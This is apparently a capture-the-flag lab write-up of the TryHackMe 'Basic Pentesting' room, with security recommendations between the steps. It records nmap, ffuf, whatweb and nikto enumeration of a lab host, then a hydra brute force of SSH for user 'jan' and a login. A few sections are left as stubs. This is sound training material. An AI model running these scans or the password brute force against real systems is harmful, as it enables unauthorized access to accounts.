# Basic Pentesting

## Ping 
So let's ping the host first to check which OS we can expect depending in the ttl.
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ ping 10.10.214.159 -c 1                                             
PING 10.10.214.159 (10.10.214.159) 56(84) bytes of data.
64 bytes from 10.10.214.159: icmp_seq=1 ttl=63 time=55.9 ms

--- 10.10.214.159 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 55.941/55.941/55.941/0.000 ms

```
`ttl=63`, we're probably dealing with a Linux machine

## NMAP
We're running nmap on the host to discover all open TCP ports. We are saving all results from the NMAP scans with the `-oA` flag.
In this case we set the minimum rate to 2000 to speed up this process.
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap 10.10.214.159 -p- --min-rate 2000 -vv -oA initallports
```

### nmap results:
```
Nmap scan report for 10.10.214.159  
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
8009/tcp open  ajp13        syn-ack
8080/tcp open  http-proxy   syn-ack

```

## NMAP sC sV 
With the `-sC` and `-sV` we're performing running the default scripts for the running services and checking the versions:
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap 10.10.214.159 -p22,80,139,445,8009,8080 -sC -sV  --min-rate 2000 -vv -oA openscsv
```

### nmap results:
```
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
|   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
|   256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        syn-ack Apache Tomcat 9.0.7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-05-19T07:45:48-04:00
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2023-05-19T11:45:48
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46004/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58027/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18973/udp): CLEAN (Failed to receive data)
|   Check 4 (port 18215/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
# SSH 
So, we have some information for the SSH service. 

SSH defautl SSH scripts are:
- sshv1: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.
- ssh-hostey: Shows SSH hostkeys.

To get some more information we will run the `ssh-auth-methods` NSE script to check which authenticatoon methods are allowed for the SSH service on this host.               
                                     
```bash
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap -p22  10.10.214.159 --script ssh-auth-methods -oA sshalgos  
```
```
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password

```

Nice, we know that the service allows password authentication which might be useful for a bruteforce attack later on.

### Security Recomendation
- It would be best to have only publickey authentication and disable password authentication

# 80 
Let's dig deeper in the different services running. We're starting with port 80 since webervers and webapplications can have a lot of different vulnerabilities which we can exploit.

When check the page-source of the page on port 80 we find a note:

```HTML
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>

```
Ah, some notes somewhere! Unfortunaly the `/dev/` directory does not exist. Let's enumerate some more

## Directory fuzzing with ffuf
```
──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.10.214.159/FUZZ -of html -o dirs80.html     -e .txt,.php,.html -v

```
With ffuf we found the `/development/directory` which corresponds to the note in the page source. Let's visit the directory in the browser to check what it's about

We find two notes:
- j.txt and
- dev.txt
 These might be the notes that we are looking for. Let's check them out:
 
### dev.txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

### j.txt


```


For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Valuable Information:
- User `J` has an easy to crack password...we keep that in mind

### Security Recomendation
-Make sure internal communication and notes are not publically available. 
-Also remove unnecessary notes from the HTML source code
-Consider if directory indexing is needed for production processes. Disable directory indexing if possible. (https://portswigger.net/kb/issues/00600100_directory-listing)

## whatweb
Next we will scan the server for used software and i'ts versions.

```┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ whatweb http://10.10.214.159 -v -a1 > whatweb80.txt

```
### Whatweb Results
```
WhatWeb report for http://10.10.214.159
Status    : 200 OK
Title     : <None>
IP        : 10.10.214.159
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]
```
This does not give us much information but we can see that the Apache version is out of date.

### Security Recommendation:
- Update the Apache version to a current supported version
- Implement a policy that checks reguraly for updates

## Nikto
For a more intrusive scan we use nikto. 
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ nikto --url http://10.10.214.15 -output nikto80.txt
```
## nikto results:
```
...
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: GET /development/: Directory indexing found.
+ OSVDB-3092: GET /development/: This might be interesting...
+ OSVDB-3233: GET /icons/README: Apache default file found.
...
```

As we could see before that the apache version is outdated and it shows us the `/development/` directory which we already found before.

# 8080
We will repeat the same process for port 8080:

## whatweb
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ whatweb http://10.10.214.159:8080 -v -a1 > whatweb8080.txt
```
```
WhatWeb report for http://10.10.214.159:8080
Status    : 200 OK
Title     : Apache Tomcat/9.0.7
IP        : 10.10.214.159
Country   : RESERVED, ZZ

Summary   : HTML5

```


## nikto
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/web]
└─$ nikto --url http://10.10.214.159:8080 -output nikto8080.txt

```

# 8009 APJ
```
┌──(kali㉿kali)-[~/…/THM/Basic Pentesting/recon/nmap]
└─$ nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.214.159 -oA APJ
ghostcat
```

# SMB 139, 445

Found staff.txt

# Hydra
Yes now we have names and it was mentioned before that Jan had a easy to crack password. So let's brute force ssh:
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.214.159
```

Bingo!
                                  
# Login with ssh:
```
ssh jan@10.10.214.159
```

